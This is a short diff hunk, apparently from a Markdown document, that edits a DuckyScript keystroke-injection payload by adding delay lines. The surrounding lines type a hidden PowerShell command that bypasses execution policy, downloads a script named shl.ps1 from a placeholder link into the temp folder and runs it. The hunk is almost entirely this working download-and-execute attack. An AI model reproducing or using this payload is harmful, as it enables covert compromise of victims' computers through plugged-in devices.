@@ -69,7 +69,9 @@ DELAY 1000
 GUI r
 DELAY 1000
 STRING powershell -w h -NoP -NonI -Exec Bypass $U='LINK_DIRETO';$P="$env:TEMP"+'\shl.ps1';iwr -Uri $U -O $P; powershell -ExecutionPolicy Bypass -File $P
+DELAY 2000
 ENTER
+DELAY 500
 
 ```
 
